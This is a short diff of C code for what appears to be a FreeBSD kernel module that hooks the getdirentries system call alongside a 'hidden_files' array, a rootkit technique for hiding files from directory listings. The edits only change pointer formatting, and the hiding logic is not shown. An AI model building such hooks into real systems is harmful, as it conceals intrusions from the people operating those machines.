@@ -17,16 +17,16 @@ const char hidden_files[][512] = {
 
 /* getdirentries system call hook */
 static int
-getdirentries_hook(struct thread* td, void* syscall_args)
+getdirentries_hook(struct thread *td, void *syscall_args)
 {
-	struct dirent* dp;
-	struct dirent* current;
-	struct getdirentries_args* /* {
+	struct dirent *dp;
+	struct dirent *current;
+	struct getdirentries_args /* {
 		int	fd;
-		char*	buf;
+		char	*buf;
 		size_t	nbytes;
-		off_t*	basep;
-	} */ uap;
+		off_t	*basep;
+	} */ *uap;
 	unsigned int size, count;
 
 	sys_getdirentries(td, syscall_args);
@@ -95,7 +95,7 @@ getdirentries_hook(struct thread* td, void* syscall_args)
 
 /* The function called at load / unload */
 static int
-load(struct module* module, int cmd, void* arg)
+load(struct module *module, int cmd, void *arg)
 {
 	int error = 0;
 
